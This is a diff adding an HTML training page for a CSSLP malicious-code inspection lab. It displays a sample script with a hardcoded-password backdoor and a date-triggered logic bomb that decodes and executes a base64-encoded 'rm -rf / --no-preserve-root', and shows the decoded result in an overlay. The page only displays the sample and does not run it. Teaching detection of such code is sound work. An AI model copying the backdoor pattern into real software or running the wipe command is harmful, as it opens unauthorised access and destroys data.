@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSSLP Domain 5: Malicious Code Inspection Lab</title>
+    <style>
+        :root {
+            --bg-dark: #0d1117;
+            --panel-bg: #161b22;
+            --malware-red: #da3633;
+            --safe-green: #238636;
+            --analyze-blue: #1f6feb;
+            --code-bg: #0d1117;
+            --text-main: #c9d1d9;
+            --border: #30363d;
+            --highlight: #f2cc60;
+        }
+        body {
+            font-family: 'Segoe UI', monospace;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        header {
+            background: #010409;
+            width: 100%;
+            padding: 15px 0;
+            text-align: center;
+            border-bottom: 3px solid var(--malware-red);
+            margin-bottom: 20px;
+        }
+        h1 { margin: 0; font-size: 1.5rem; color: var(--malware-red); }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            width: 95%;
+            max-width: 1400px;
+            height: 700px;
+        }
+
+        /* CONTROLS (LEFT) */
+        .controls {
+            background: var(--panel-bg);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+        
+        .section-title {
+            color: #8b949e;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            border-bottom: 1px solid #475569;
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            color: white;
+            transition: 0.2s;
+        }
+        .btn-scan { background: var(--analyze-blue); }
+        .btn-decode { background: #f59e0b; color: black; }
+        .btn-report { background: var(--safe-green); }
+        
+        button:hover { filter: brightness(1.1); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .findings-list {
+            margin-top: 20px;
+            border-top: 1px solid var(--border);
+            padding-top: 10px;
+        }
+        .finding-item {
+            background: rgba(218, 54, 51, 0.1);
+            border-left: 3px solid var(--malware-red);
+            padding: 10px;
+            margin-bottom: 5px;
+            font-size: 0.8rem;
+            display: none; /* Hidden initially */
+        }
+
+        /* CODE VIEWER (RIGHT) */
+        .code-panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .panel-header {
+            padding: 10px 20px;
+            border-bottom: 1px solid var(--border);
+            background: #0d1117;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .code-container {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 15px;
+            background: var(--code-bg);
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: #c9d1d9;
+            white-space: pre-wrap;
+        }
+
+        /* Syntax Highlighting & Analysis Markers */
+        .kw { color: #ff7b72; }
+        .str { color: #a5d6a7; }
+        .fn { color: #d2a8ff; }
+        .cmt { color: #8b949e; font-style: italic; }
+        
+        .high-entropy {
+            background: rgba(245, 158, 11, 0.2);
+            border-bottom: 2px solid #f59e0b;
+            cursor: pointer;
+        }
+        .backdoor {
+            background: rgba(218, 54, 51, 0.2);
+            border-bottom: 2px solid var(--malware-red);
+            cursor: pointer;
+        }
+
+        /* DECODE OVERLAY */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .overlay-box {
+            background: #161b22;
+            border: 1px solid var(--border);
+            padding: 20px;
+            border-radius: 8px;
+            width: 500px;
+            color: #c9d1d9;
+        }
+        .overlay-header { font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        .decoded-text {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            color: var(--malware-red);
+            margin-bottom: 15px;
+            white-space: pre-wrap;
+        }
+
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Malicious Code Inspector</h1>
+    <p>Detecting Logic Bombs, Backdoors, and High Entropy Payloads</p>
+</header>
+
+<div class="dashboard">
+
+    <!-- CONTROLS -->
+    <div class="controls">
+        <div class="section-title">Analysis Tools</div>
+        <button class="btn-scan" onclick="runScan()">🔍 Run Entropy & Static Analysis</button>
+        <button class="btn-decode" id="btn-decode" onclick="showDecoder()" disabled>🔓 Decode Selected Payload</button>
+        
+        <div class="section-title" style="margin-top:20px;">Findings</div>
+        <div class="findings-list" id="findings">
+            <div class="finding-item" id="find-entropy">
+                <strong>High Entropy String Detected</strong><br>
+                Entropy: 5.8 (Suspicious)<br>
+                Line: 12
+            </div>
+            <div class="finding-item" id="find-backdoor">
+                <strong>Potential Backdoor</strong><br>
+                Hardcoded Credential Check<br>
+                Line: 5
+            </div>
+            <div id="no-findings" style="color:#666; text-align:center; padding:10px;">No scan run yet.</div>
+        </div>
+
+        <div class="section-title" style="margin-top:20px;">Action</div>
+        <button class="btn-report" onclick="generateReport()">📄 Generate Incident Report</button>
+    </div>
+
+    <!-- CODE VIEWER -->
+    <div class="code-panel">
+        <div class="panel-header">
+            <span>suspicious_script.js</span>
+            <span style="font-size:0.8rem; color:#8b949e;">Size: 2KB</span>
+        </div>
+        <div class="code-container" id="code-view">
+<span class="kw">function</span> <span class="fn">authenticate</span>(user, pass) {
+    <span class="cmt">// Standard auth check</span>
+    <span class="kw">if</span> (db.validate(user, pass)) {
+        <span class="kw">return</span> <span class="kw">true</span>;
+    }
+    
+    <span class="cmt">// Developer Override (REMOVE BEFORE PROD)</span>
+    <span class="kw">if</span> (pass === <span class="str" id="code-backdoor">"MagicKey_99!"</span>) {
+        console.log(<span class="str">"Backdoor Access Granted"</span>);
+        <span class="kw">return</span> <span class="kw">true</span>;
+    }
+    
+    <span class="kw">return</span> <span class="kw">false</span>;
+}
+
+<span class="kw">function</span> <span class="fn">dailyMaintenance</span>() {
+    <span class="kw">const</span> today = <span class="kw">new</span> Date();
+    
+    <span class="cmt">// Check for hidden payload trigger</span>
+    <span class="kw">if</span> (today.getDate() === 13 && today.getDay() === 5) {
+        <span class="cmt">// Execute payload</span>
+        <span class="kw">const</span> payload = <span class="str" id="code-entropy">"cm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290"</span>; 
+        exec(atob(payload));
+    }
+}
+        </div>
+    </div>
+
+</div>
+
+<!-- DECODE OVERLAY -->
+<div class="overlay" id="decode-modal">
+    <div class="overlay-box">
+        <div class="overlay-header">Base64 Decode Result</div>
+        <div style="font-size:0.9rem; margin-bottom:5px;">Encoded: <span style="color:#f59e0b">"cm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290"</span></div>
+        <div style="font-size:0.9rem; margin-bottom:5px;">Decoded:</div>
+        <div class="decoded-text">rm -rf / --no-preserve-root</div>
+        <p style="color:#8b949e; font-size:0.8rem;">Analysis: This is a destructive command (Logic Bomb) designed to wipe the file system.</p>
+        <button class="btn-scan" onclick="closeModal()">Close</button>
+    </div>
+</div>
+
+<script>
+    let scanned = false;
+
+    function runScan() {
+        scanned = true;
+        const noFind = document.getElementById('no-findings');
+        const entropy = document.getElementById('find-entropy');
+        const backdoor = document.getElementById('find-backdoor');
+        const decodeBtn = document.getElementById('btn-decode');
+
+        // Visual scanning effect
+        noFind.innerText = "Scanning...";
+        
+        setTimeout(() => {
+            noFind.style.display = 'none';
+            entropy.style.display = 'block';
+            backdoor.style.display = 'block';
+            decodeBtn.disabled = false;
+
+            // Highlight Code
+            document.getElementById('code-entropy').classList.add('high-entropy');
+            document.getElementById('code-backdoor').classList.add('backdoor');
+
+            alert("Scan Complete. 2 Issues Found.\n1. High Entropy String (Potential Obfuscated Payload)\n2. Hardcoded Credential (Backdoor)");
+        }, 1000);
+    }
+
+    function showDecoder() {
+        document.getElementById('decode-modal').style.display = 'flex';
+    }
+
+    function closeModal() {
+        document.getElementById('decode-modal').style.display = 'none';
+    }
+
+    function generateReport() {
+        if (!scanned) {
+            alert("Please run a scan first.");
+            return;
+        }
+        alert("Incident Report Generated:\n\nSEVERITY: CRITICAL\n\nFINDINGS:\n1. Backdoor found in auth logic (Line 6).\n2. Logic Bomb (Time-triggered) found in maintenance task (Line 15).\n3. Payload identified as 'rm -rf /' (System Wipe).\n\nRECOMMENDATION: Isolate system immediately. Do not deploy.");
+    }
+
+</script>
+
+</body>
+</html>
